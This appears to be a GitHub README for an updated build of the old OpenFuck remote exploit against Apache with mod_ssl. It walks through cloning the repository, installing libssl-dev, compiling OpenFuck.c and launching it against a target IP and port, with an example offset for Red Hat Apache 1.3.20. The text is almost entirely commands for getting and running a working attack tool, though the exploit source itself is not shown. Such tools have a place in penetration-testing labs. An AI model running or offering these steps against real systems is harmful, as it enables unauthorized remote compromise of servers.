# OpenLuck
Original is OpenFu*&%$#, I change for something more elegant

## Usage

This Exploit (https://www.exploit-db.com/exploits/764/) is outdated. Here you can take updated

1. Download OpenFuck.c
```
git clone https://github.com/heltonWernik/OpenFuck.git
```
2. Install ssl-dev library

```
apt-get install libssl-dev
```

3. It's Compile Time

````
gcc -o OpenFuck OpenFuck.c -lcrypto
````

4. Running the Exploit
```
./OpenFuck
```

5. See which service you witch to exploit. For example if you need to Red Hat Linux, using apache version 1.3.20. Trying out using the 0x6a option
./OpenFuck 0x6a [Target Ip] [port] -c 40

for example:
```
./OpenFuck 0x6a 192.168.80.145 443 -c 40
```

**References:**
https://kongwenbin.wordpress.com/tag/openfuck/
https://medium.com/@javarmutt/how-to-compile-openfuckv2-c-69e457b4a1d1
